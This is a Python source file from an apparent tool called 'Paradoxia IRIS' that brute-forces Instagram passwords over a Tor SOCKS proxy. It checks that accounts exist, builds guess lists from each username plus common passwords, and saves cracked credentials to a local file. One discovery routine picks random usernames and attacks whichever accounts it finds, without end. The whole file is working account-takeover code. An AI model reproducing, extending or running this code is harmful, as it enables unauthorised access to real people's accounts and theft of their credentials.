from colorama import Fore, Style
import colorama
import requests
from .core import *
from InstagramPy.InstagramPyCLI import InstagramPyCLI
from InstagramPy.InstagramPySession import InstagramPySession , DEFAULT_PATH
from InstagramPy.InstagramPyInstance import InstagramPyInstance
from datetime import datetime

proxies = {
    'http': 'socks5://127.0.0.1:9050',
    'https': 'socks5://127.0.0.1:9050'
}

def BruteForceInstagram(username, password, mode = False):

    appInfo = {
   "version"     : "0.0.1",
   "name"        : "Paradoxia IRIS",
   "description" : "Choose Strong Passwords",
   "author"      : "QuantumCore",
   "company"     : "QCORED",
   "year"        : "2020",
   "example"     : ""
    }
    
    cli = InstagramPyCLI(appinfo = appInfo , started = datetime.now() , verbose_level = 3, username=username)

    session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli)
    session.ReadSaveFile(False) # True to countinue attack if found save file.
    instagrampy = InstagramPyInstance(cli = None ,session = session)
    with open(password, "r") as list:
        lines = list.readlines()
    if(mode == True):
        print('[*] Brute Forcing ' + username + ' {len} Passwords...'.format(len = str(len(lines))))
    else:
        print('[*] Brute Forcing ' + username + ' with {len} probable weak Passwords.'.format(len = str(len(lines))))

    for i in range(len(lines)):
        instagrampy.TryPassword()
        if not instagrampy.PasswordFound():
            print(Style.BRIGHT + Fore.LIGHTYELLOW_EX)
            print('[-] Login Failed ' + username + ':' +session.CurrentPassword())
            instagrampy.TryPassword()
            
        if instagrampy.PasswordFound():
            print(Style.BRIGHT + Fore.CYAN)
            print('[+] Password Found: '+session.CurrentPassword())
            with open("accounts.iris", "a+") as found:
                found.write("\n[INSTAGRAM] " + username + ":"+session.CurrentPassword())
                break
        else:
            pass    


def isInstagramUser(user):
    try:
        rsp = requests.get("https://instagram.com/" + user + "/")
        if(rsp.status_code == 404):
            # print(Fore.RED + Style.BRIGHT + "[+] Account {account} not found.".format(account = user))
            return False
        elif(rsp.status_code == 200):
            print(Style.BRIGHT + Fore.LIGHTBLUE_EX + "[+] Account {account} found.".format(account = user))
            return True
    except Exception as error:
        print(Fore.RED + Style.BRIGHT + "[X] Error : " + str(error))
        print(Fore.RED + Style.BRIGHT + "[X] Connection Refused. Make sure TOR Socks Proxy is running on 127.0.0.1:9050 and you have an Active Internet Connection.")

def create_temp_list(user):
    with open("temp.iris", "w") as wlist:
        for i in range(20):
            r = random_password(user)
            wlist.write(r+"\n")
        with open("top_common.list", "r") as common:
            for l in common.readlines():
                wlist.write(l)
        
        wlist.write("\n"+user+"12345")
        wlist.write("\n"+user+"123456789")
        wlist.write("\n"+user+"12345678")
        wlist.write("\n"+user+"123")
        wlist.write("\n"+user+"password")
        wlist.write("\n"+user+"2009")
        wlist.write("\n"+user+"2010")
        wlist.write("\n"+user+"2015")
        wlist.write("\n"+user+"2019")
        wlist.write("\n"+user+"2020")


def BRUTEFORCE(USER, password_list):
    while(True):
        if(isInstagramUser(USER) == True):
            BruteForceInstagram(USER, password_list, mode=True)
            break
        else:
            break     

def BRUTEFORCE_DISCOVERY():
    while(True):
        USER = random_email(username_also=True)
        if(isInstagramUser(USER[0]) == True):
            with open("usernames.iris", "a+") as userfile:
                userfile.write("\n[INSTAGRAM USER] : {s}/{p}".format(s=USER[0], p=USER[1]))
            create_temp_list(USER[1])
            BruteForceInstagram(USER[1], "temp.iris")
        else:
            pass 